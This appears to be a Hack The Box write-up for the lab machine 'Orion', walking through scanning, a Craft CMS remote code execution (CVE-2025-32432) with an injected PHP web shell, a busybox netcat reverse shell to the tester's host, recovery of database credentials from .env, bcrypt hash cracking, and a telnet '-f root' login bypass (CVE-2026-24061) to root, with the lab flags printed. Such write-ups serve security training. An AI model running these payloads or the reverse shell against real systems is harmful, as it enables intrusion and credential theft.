@@ -1,0 +1,692 @@
+
+
+| ////////////////// | //////////////// | /////////////////////// |
+| ------------------ | ---------------- | ----------------------- |
+| Server IP Address  | Ports Open       |                         |
+| 10.129.137.15      | 22,80            |                         |
+| 2026/10/21         |                  |                         |
+
+https://app.hackthebox.com/machines/Orion
+
+
+### **Attack Chain Summary**
+
+- **1. Initial Access**
+    
+    - Leveraged a Remote Code Execution (RCE) vulnerability in Craft CMS (**CVE-2025-32432**) to establish initial foothold access to the target environment.
+        
+- **2. Credential Discovery**
+    
+    - Enumerated system environment variables during the post-exploitation phase and successfully recovered plaintext MySQL database login credentials.
+        
+- **3. Database Enumeration & Hash Cracking**
+    
+    - Connected to the host MySQL database using the discovered credentials, extracted the administrator user password hash, and subsequently cracked the hash to retrieve the plaintext admin password.
+        
+- **4. Local Service Enumeration & Privilege Escalation**
+    
+    - Identified a local Telnet 2.7 service running on the internal network.
+        
+    - Exploited a vulnerability in the service (**CVE-2026-24061**) to escalate privileges and successfully achieve root access.
+
+
+
+
+Port Scan
+```
+┌──(chako㉿kali)-[~/writeup/htb/easy/linux/1-orion]
+└─$ nmap -p- -vvv --min-rate 10000 orion -oN nmap/orion_allport --open                                                                                                                                                                            
+Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-22 01:54 -0400
+mass_dns: Using DNS server 192.168.4.1
+mass_dns: Using DNS server fd0c:6c7b:e14c:1::1
+Initiating Parallel DNS resolution of 1 host. at 01:54
+Completed Parallel DNS resolution of 1 host. at 01:54, 0.00s elapsed
+Initiating Ping Scan at 01:54
+Scanning orion (10.129.137.15) [4 ports]
+Completed Ping Scan at 01:54, 0.12s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 01:54
+Completed Parallel DNS resolution of 1 host. at 01:54, 0.00s elapsed
+Initiating SYN Stealth Scan at 01:54
+Scanning orion (10.129.137.15) [65535 ports]
+Discovered open port 80/tcp on 10.129.137.15
+Discovered open port 22/tcp on 10.129.137.15
+Completed SYN Stealth Scan at 01:55, 7.49s elapsed (65535 total ports)
+Nmap scan report for orion (10.129.137.15)
+Host is up, received echo-reply ttl 63 (0.092s latency).
+Scanned at 2026-10-22 01:54:56 EDT for 7s
+Not shown: 63640 closed tcp ports (reset), 1893 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+Read data files from: /usr/share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 7.72 seconds
+           Raw packets sent: 72981 (3.211MB) | Rcvd: 64251 (2.570MB)
+
+
+
+
+
+
+
+┌──(chako㉿kali)-[~/writeup/htb/easy/linux/1-orion]
+└─$ nmap -p 22,80 -sCV orion -oN nmap/orion                                                                                                                                                                                                       
+Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-22 01:58 -0400
+Nmap scan report for orion (10.129.137.15)
+Host is up (0.080s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://orion.htb/
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.91 seconds
+
+
+```
+
+
+
+
+found `admin` folder
+```
+┌──(chako㉿kali)-[~/writeup/htb/easy/linux/1-orion]
+└─$ ffuf -t 30 -r -w /usr/share/dirb/wordlists/common.txt -u http://orion.htb/FUZZ -e .git,.php,.html,.txt.bak,.zip -mc 200                                                                                                                        
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://orion.htb/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
+ :: Extensions       : .git .php .html .txt.bak .zip 
+ :: Follow redirects : true
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 30
+ :: Matcher          : Response status: 200
+________________________________________________
+
+                        [Status: 200, Size: 12272, Words: 1076, Lines: 386, Duration: 116ms]
+admin                   [Status: 200, Size: 40066, Words: 2023, Lines: 139, Duration: 751ms]
+index.html              [Status: 200, Size: 9689, Words: 2708, Lines: 183, Duration: 206ms]
+index.html              [Status: 200, Size: 9689, Words: 2708, Lines: 183, Duration: 155ms]
+index                   [Status: 200, Size: 12272, Words: 1076, Lines: 386, Duration: 500ms]
+index.php               [Status: 200, Size: 12272, Words: 1076, Lines: 386, Duration: 516ms]
+index.php               [Status: 200, Size: 12272, Words: 1076, Lines: 386, Duration: 490ms]
+logout                  [Status: 200, Size: 12272, Words: 1076, Lines: 386, Duration: 429ms]
+:: Progress: [27684/27684] :: Job [1/1] :: 16 req/sec :: Duration: [0:05:52] :: Errors: 0 ::
+
+
+```
+
+
+![[orion-web.png]]
+
+
+search Exploit `CraftCMS`
+```
+┌──(chako㉿kali)-[~/writeup/htb/easy/linux/1-orion]
+└─$ searchsploit Craft CMS 
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                                                                   |  Path
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Craft CMS 2.6 - Cross-Site Scripting                                                                                                                                                                             | php/webapps/42143.txt
+Craft CMS 2.7.9/3.2.5 - Information Disclosure                                                                                                                                                                   | php/webapps/47343.txt
+Craft CMS 3.0.25 - Cross-Site Scripting                                                                                                                                                                          | php/webapps/46054.txt
+Craft CMS 3.1.12 Pro - Cross-Site Scripting                                                                                                                                                                      | php/webapps/46496.txt
+Craft CMS 4.4.14 - Unauthenticated Remote Code Execution                                                                                                                                                         | php/webapps/51918.py
+Craft CMS 5.6.16 - RCE                                                                                                                                                                                           | multiple/webapps/52525.py
+Craft CMS SEOmatic plugin 3.1.4 - Server-Side Template Injection                                                                                                                                                 | linux/webapps/45108.txt
+CraftCMS 3 vCard Plugin 1.0.0 - Remote Code Execution                                                                                                                                                            | php/webapps/48492.py
+craftercms 4.x.x - CORS                                                                                                                                                                                          | multiple/webapps/51313.txt
+
+```
+
+
+exploit:
+```
+msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > set RHOSTS orion.htb
+RHOSTS => orion.htb
+msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > set lhost tun0
+lhost => 10.10.15.225
+msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > run
+[*] Started reverse TCP handler on 10.10.15.225:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] Leaked session.save_path: /var/lib/php/sessions
+[+] The target is vulnerable. Session path leaked
+[*] Injecting stub & triggering payload...
+[*] Sending stage (72686 bytes) to 10.129.137.15
+[*] Sending stage (72686 bytes) to 10.129.137.15
+[-] Meterpreter session 2 is not valid and will be closed
+[*] 10.129.137.15 - Meterpreter session 2 closed.
+[*] Sending stage (72686 bytes) to 10.129.137.15
+[-] Meterpreter session 3 is not valid and will be closed
+
+```
+
+
+
+https://www.youtube.com/watch?v=G_ujA3OIV_A
+https://github.com/CTY-Research-1/CVE-2025-32432-PoC
+
+follow this video  i finally get the exploit to work 
+```
+┌──(chako㉿kali)-[~/writeup/htb/easy/linux/1-orion/exp/CVE-2025-32432-PoC]
+└─$ python3 craftcms_final_payload.py -u http://orion.htb -c "id"                                                                                                                                                                                  
+[*] 目標: http://orion.htb
+[+] 找到 assetId = 0
+[+] 注入 PHP: <?=shell_exec($_GET['cmd']);die()?>
+[+] CSRF  = LiJ3XSUSBAZCVkdraF9MzW4H3wM2MXjcyYend7UPDEdfGLBTguu5OFYbRQ4deXVvexEQDV5uA5UYa7RaXnhJlJbu3yb-fyEEHGD6FeSJyXM=   SessionID = pd49kgp8ratrg8t447b1drf4f6
+[*] 送第二包觸發 RCE ...
+[+] 指令輸出 ↓↓↓
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+┌──(chako㉿kali)-[~/writeup/htb/easy/linux/1-orion/exp/CVE-2025-32432-PoC]
+└─$ python3 craftcms_final_payload.py -u http://orion.htb -c "ls -la"                                                                                                                                                                            
+[*] 目標: http://orion.htb
+[+] 找到 assetId = 0
+[+] 注入 PHP: <?=shell_exec($_GET['cmd']);die()?>
+[+] CSRF  = zXQFeMdiY-0Az-CCxtsMGJZz0c1fAusOhQEXdnOhS_rk0Nk3HnyafrlZTSuCOgq_RaS42qC8Vk3XNKmeL3eEa_xqQRInxwGio5ewUHgPois=   SessionID = rnos521s1b880p0ne52n9680i2
+[*] 送第二包觸發 RCE ...
+[+] 指令輸出 ↓↓↓
+total 36
+drwxrwxr-x  4 www-data www-data 4096 Mar  7  2026 .
+drwxrwxr-x  7 www-data www-data 4096 Mar  6  2026 ..
+-rw-rw-r--  1 www-data www-data  283 Nov 18  2025 .htaccess
+drwxr-xr-x  5 www-data www-data 4096 Mar  6  2026 assets
+drwxrwxr-x 19 www-data www-data 4096 Oct 22 07:20 cpresources
+-rw-r--r--  1 www-data www-data 9689 Mar  6  2026 index.html
+-rw-rw-r--  1 www-data www-data  258 Nov 18  2025 index.php
+
+```
+
+
+
+get reverse shell
+```
+┌──(chako㉿kali)-[~/writeup/htb/easy/linux/1-orion/exp/CVE-2025-32432-PoC]
+└─$ python3 craftcms_final_payload.py -u http://orion.htb -c "busybox nc 10.10.15.225 4500 -e sh"                                                                                                                        
+[*] 目標: http://orion.htb
+[+] 找到 assetId = 0
+[+] 注入 PHP: <?=shell_exec($_GET['cmd']);die()?>
+[+] CSRF  = -aO2HPy5eXydiVJzEhyksxxzrF62Sk34Vm1TW4BDrv1dXrCSYL9qRo-R9yuU0Sk9_7FiHiFO_P5yGMIB9Ds6gicjMgTCDfjIbCaE2TCOEDw=   SessionID = 461d4tirsfom97mn08omfmvstm
+[*] 送第二包觸發 RCE ...
+
+
+┌──(chako㉿kali)-[~/writeup/htb/easy/linux]                                                                                                                                                                                                        
+└─$ nc -lvnp 4500                                                                                                                                                                                                                                  
+listening on [any] 4500 ...                                                                                                                                                                                                                        
+connect to [10.10.15.225] from (UNKNOWN) [10.129.137.19] 55580                                                                                                                                                                                     
+id                                                                                                                                                                                                                                                 
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+
+
+```
+
+Spawn a Pseudo-TTY (Python)
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@orion:~/html/craft/web$ 
+
+```
+
+
+mysql db password
+```
+www-data@orion:~/html/craft$ printenv
+printenv
+CRAFT_ENVIRONMENT=dev
+CRAFT_DB_PORT=3306
+CRAFT_APP_ID=CraftCMS--67912ad2-1f1b-4993-bfec-e64daa5c23ff
+PWD=/var/www/html/craft
+PRIMARY_SITE_URL=http://orion.htb/
+CRAFT_DB_DATABASE=orion
+HOME=/var/www
+CRAFT_DB_TABLE_PREFIX=
+CRAFT_DB_DRIVER=mysql
+CRAFT_DB_SERVER=127.0.0.1
+USER=www-data
+SHLVL=2
+CRAFT_DB_USER=root
+LC_CTYPE=C.UTF-8
+CRAFT_SECURITY_KEY=RRS86F6i2JQKdC6kfEI7frVxA47WVMx8
+CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
+PATH=/sbin:/usr/sbin:/bin:/usr/bin
+CRAFT_DISALLOW_ROBOTS=true
+CRAFT_DEV_MODE=true
+CRAFT_ALLOW_ADMIN_CHANGES=true
+CRAFT_DB_SCHEMA=
+_=/bin/printenv
+OLDPWD=/var/www/html/craft/config
+www-data@orion:~/html/craft$ 
+
+
+
+
+www-data@orion:~/html/craft$ ls -la
+ls -la
+total 364
+drwxrwxr-x  7 www-data www-data   4096 Mar  6  2026 .
+drwxr-xr-x  3 root     root       4096 Mar  6  2026 ..
+-rw-rw-r--  1 www-data www-data    718 Mar  6  2026 .env
+-rw-rw-r--  1 www-data www-data    411 Nov 18  2025 .env.example.dev
+-rw-rw-r--  1 www-data www-data    623 Nov 18  2025 .env.example.production
+-rw-rw-r--  1 www-data www-data    619 Nov 18  2025 .env.example.staging
+-rw-rw-r--  1 www-data www-data     31 Nov 18  2025 .gitignore
+-rw-rw-r--  1 www-data www-data    624 Nov 18  2025 bootstrap.php
+-rw-rw-r--  1 www-data www-data    611 Mar  6  2026 composer.json
+-rw-rw-r--  1 www-data www-data 310507 Mar  6  2026 composer.lock
+drwxrwxr-x  4 www-data www-data   4096 Mar  6  2026 config
+-rwxr-xr-x  1 www-data www-data    309 Nov 18  2025 craft
+drwxrwxr-x  5 www-data www-data   4096 Mar  6  2026 storage
+drwxrwxr-x  2 www-data www-data   4096 Mar 10  2026 templates
+drwxrwxr-x 49 www-data www-data   4096 Mar  6  2026 vendor
+drwxrwxr-x  4 www-data www-data   4096 Mar  7  2026 web
+www-data@orion:~/html/craft$ cat .env
+cat .env
+# Read about configuration, here:
+# https://craftcms.com/docs/5.x/configure.html
+
+# The application ID used to to uniquely store session and cache data, mutex locks, and more
+CRAFT_APP_ID=CraftCMS--67912ad2-1f1b-4993-bfec-e64daa5c23ff
+
+# The environment Craft is currently running in (dev, staging, production, etc.)
+CRAFT_ENVIRONMENT=dev
+
+# General settings
+CRAFT_SECURITY_KEY=RRS86F6i2JQKdC6kfEI7frVxA47WVMx8
+CRAFT_DEV_MODE=true
+CRAFT_ALLOW_ADMIN_CHANGES=true
+CRAFT_DISALLOW_ROBOTS=true
+CRAFT_DB_DRIVER=mysql
+CRAFT_DB_SERVER=127.0.0.1
+CRAFT_DB_PORT=3306
+CRAFT_DB_DATABASE=orion
+CRAFT_DB_USER=root
+CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
+CRAFT_DB_SCHEMA=
+CRAFT_DB_TABLE_PREFIX=
+
+PRIMARY_SITE_URL=http://orion.htb/
+www-data@orion:~/html/craft$ 
+
+
+
+```
+
+
+
+
+login to `MySQL`
+```
+www-data@orion:~/html/craft$ mysql -u root -p
+mysql -u root -p
+Enter password: SuperSecureCraft123Pass!
+
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 54
+Server version: 10.6.23-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]> 
+
+```
+
+
+check db
+```
+MariaDB [(none)]> show databases;
+show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| orion              |
+| performance_schema |
+| sys                |
++--------------------+
+5 rows in set (0.002 sec)
+
+MariaDB [(none)]> use orion
+use orion
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MariaDB [orion]> show tables;
+show tables;
++----------------------------+
+| Tables_in_orion            |
++----------------------------+
+| addresses                  |
+| announcements              |
+| assetindexdata             |
+| assetindexingsessions      |
+| assets                     |
+| assets_sites               |
+| authenticator              |
+| categories                 |
+| categorygroups             |
+| categorygroups_sites       |
+| changedattributes          |
+| changedfields              |
+| craftidtokens              |
+| deprecationerrors          |
+| drafts                     |
+| elementactivity            |
+| elements                   |
+| elements_bulkops           |
+| elements_owners            |
+| elements_sites             |
+| entries                    |
+| entries_authors            |
+| entrytypes                 |
+| fieldlayouts               |
+| fields                     |
+| globalsets                 |
+| gqlschemas                 |
+| gqltokens                  |
+| imagetransformindex        |
+| imagetransforms            |
+| info                       |
+| migrations                 |
+| plugins                    |
+| projectconfig              |
+| queue                      |
+| recoverycodes              |
+| relations                  |
+| resourcepaths              |
+| revisions                  |
+| searchindex                |
+| sections                   |
+| sections_entrytypes        |
+| sections_sites             |
+| sequences                  |
+| sessions                   |
+| shunnedmessages            |
+| sitegroups                 |
+| sites                      |
+| sso_identities             |
+| structureelements          |
+| structures                 |
+| systemmessages             |
+| taggroups                  |
+| tags                       |
+| tokens                     |
+| usergroups                 |
+| usergroups_users           |
+| userpermissions            |
+| userpermissions_usergroups |
+| userpermissions_users      |
+| userpreferences            |
+| users                      |
+| volumefolders              |
+| volumes                    |
+| webauthn                   |
+| widgets                    |
++----------------------------+
+66 rows in set (0.001 sec)
+
+MariaDB [orion]> 
+
+```
+
+
+admin password hash
+```
+MariaDB [orion]> select id, username,email,password from users;
+select id, username,email,password from users;
++----+----------+----------------+--------------------------------------------------------------+
+| id | username | email          | password                                                     |
++----+----------+----------------+--------------------------------------------------------------+
+|  1 | admin    | adam@orion.htb | $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS |
++----+----------+----------------+--------------------------------------------------------------+
+1 row in set (0.000 sec)
+
+MariaDB [orion]> 
+
+```
+
+
+
+
+cracking ntml hash
+we got root password `darkangel`
+```
+.\hashcat64.exe -m 1000 .\ntml.txt .\rockyou.txt
+
+
+
+PS C:\Users\chako\Desktop\hashcat-7.1.2> type .\orion_bcrypt_hash.txt
+$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS
+PS C:\Users\chako\Desktop\hashcat-7.1.2> .\hashcat.exe -m 3200 .\orion_bcrypt_hash.txt .\rockyou.txt
+hashcat (v7.1.2) starting
+
+Failed to initialize the AMD main driver HIP runtime library. Please install the AMD HIP SDK.
+
+Failed to initialize AMD HIP RTC library. Please install the AMD HIP SDK.
+
+ADL2_Overdrive_Caps(): -8
+
+ADL2_Overdrive_Caps(): -8
+
+ADL2_Overdrive_Caps(): -8
+
+ADL2_Overdrive_Caps(): -8
+
+ADL2_Overdrive_Caps(): -8
+
+CUDA API (CUDA 13.3)
+====================
+* Device #01: NVIDIA GeForce RTX 5070, 11035/12226 MB, 48MCU
+
+OpenCL API (OpenCL 3.0 CUDA 13.3.80) - Platform #1 [NVIDIA Corporation]
+=======================================================================
+* Device #02: NVIDIA GeForce RTX 5070, skipped
+
+OpenCL API (OpenCL 2.1 AMD-APP (3652.0)) - Platform #2 [Advanced Micro Devices, Inc.]
+=====================================================================================
+* Device #03: AMD Radeon(TM) Graphics, 18549/37099 MB (14896 MB allocatable), 1MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 72
+Minimum salt length supported by kernel: 0
+Maximum salt length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Single-Hash
+* Single-Salt
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory allocated for this attack: 718 MB (35010 MB free)
+
+Dictionary cache built:
+* Filename..: .\rockyou.txt
+* Passwords.: 14344403
+* Bytes.....: 139921664
+* Keyspace..: 14344396
+* Runtime...: 1 sec
+
+$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS:darkangel
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
+Hash.Target......: $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/...LUg0lS
+Time.Started.....: Thu Oct 22 00:53:31 2026 (4 secs)
+Time.Estimated...: Thu Oct 22 00:53:35 2026 (0 secs)
+Kernel.Feature...: Pure Kernel (password length 0-72 bytes)
+Guess.Base.......: File (.\rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#01........:      327 H/s (13.61ms) @ Accel:1 Loops:32 Thr:24 Vec:1
+Speed.#03........:        3 H/s (19.29ms) @ Accel:1 Loops:32 Thr:16 Vec:1
+Speed.#*.........:      330 H/s
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 1152/14344396 (0.01%)
+Rejected.........: 0/1152 (0.00%)
+Restore.Point....: 0/14344396 (0.00%)
+Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:8160-8192
+Restore.Sub.#03..: Salt:0 Amplifier:0-1 Iteration:5728-5760
+Candidate.Engine.: Device Generator
+Candidates.#01...: princess -> jocelyn
+Candidates.#03...: 123456 -> iloveyou
+Hardware.Mon.#01.: Temp: 56c Fan:  0% Util: 99% Core:2932MHz Mem:13801MHz Bus:16
+Hardware.Mon.#03.: Temp:  0c Fan:  0% Util:  0% Core: 600MHz Mem:1800MHz Bus:16
+
+Started: Thu Oct 22 00:53:15 2026
+Stopped: Thu Oct 22 00:53:36 2026
+PS C:\Users\chako\Desktop\hashcat-7.1.2>
+
+```
+
+ssh login 
+```
+┌──(chako㉿kali)-[~/writeup/htb/easy/linux/1-orion]
+└─$ ssh adam@orion.htb
+adam@orion.htb's password: 
+Permission denied, please try again.
+adam@orion.htb's password: 
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-177-generic x86_64)
+
+adam@orion:~$ 
+
+adam@orion:~$ cat user.txt 
+c4bbb2ff8a8e10711e0c94bf876d124d
+
+
+```
+
+
+it is running telnet(port 23) locally 
+```
+adam@orion:~$ ss -tulpn
+Netid                    State                     Recv-Q                    Send-Q                                       Local Address:Port                                       Peer Address:Port                    Process                    
+udp                      UNCONN                    0                         0                                            127.0.0.53%lo:53                                              0.0.0.0:*                                                  
+udp                      UNCONN                    0                         0                                                  0.0.0.0:68                                              0.0.0.0:*                                                  
+tcp                      LISTEN                    0                         80                                               127.0.0.1:3306                                            0.0.0.0:*                                                  
+tcp                      LISTEN                    0                         128                                                0.0.0.0:22                                              0.0.0.0:*                                                  
+tcp                      LISTEN                    0                         511                                                0.0.0.0:80                                              0.0.0.0:*                                                  
+tcp                      LISTEN                    0                         4096                                         127.0.0.53%lo:53                                              0.0.0.0:*                                                  
+tcp                      LISTEN                    0                         10                                               127.0.0.1:23                                              0.0.0.0:*                                                  
+tcp                      LISTEN                    0                         128                                                   [::]:22                                                 [::]:*                                                  
+adam@orion:~$ netstat -tulnp
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:23            0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
+adam@orion:~$ 
+
+
+
+adam@orion:~$ telnet --version
+telnet (GNU inetutils) 2.7
+Copyright (C) 2025 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <https://gnu.org/licenses/gpl.html>.
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+
+Written by many authors.
+
+```
+
+
+https://github.com/0xBlackash/CVE-2026-24061
+telnet 2.7 has vulnerability (CVE-2026-24061)
+```
+adam@orion:~$ USER="-f root" telnet -a 127.0.0.1
+Trying 127.0.0.1...
+Connected to 127.0.0.1.
+Escape character is '^]'.
+
+Linux 5.15.0-177-generic (orion) (pts/2)
+
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-177-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Thu Oct 22 08:01:57 AM UTC 2026
+
+  System load:  0.0               Processes:             228
+  Usage of /:   77.4% of 5.81GB   Users logged in:       1
+  Memory usage: 9%                IPv4 address for eth0: 10.129.137.19
+  Swap usage:   0%
+
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+   just raised the bar for easy, resilient and secure K8s cluster deployment.
+
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+2 additional security updates can be applied with ESM Apps.
+Learn more about enabling ESM Apps service at https://ubuntu.com/esm
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+root@orion:~# 
+
+
+
+
+root@orion:~# cat root.txt
+5dcc8f9ce3364329b5de8582dcdf575a
+root@orion:~# 
+
+```
+
+
+
+ref:
+https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
+https://wiki.zacheller.dev/pentest/privilege-escalation/spawning-a-tty-shell
+https://www.revshells.com/
+
+https://gchq.github.io/CyberChef/
+
+https://github.com/0xBlackash/CVE-2026-24061
+https://www.youtube.com/@bamtoyanto
+https://www.youtube.com/watch?v=G_ujA3OIV_A&t=2204s
+
+https://medium.com/@bericontraster/orion-hackthebox-detailed-walkthrough-14c3d79de607
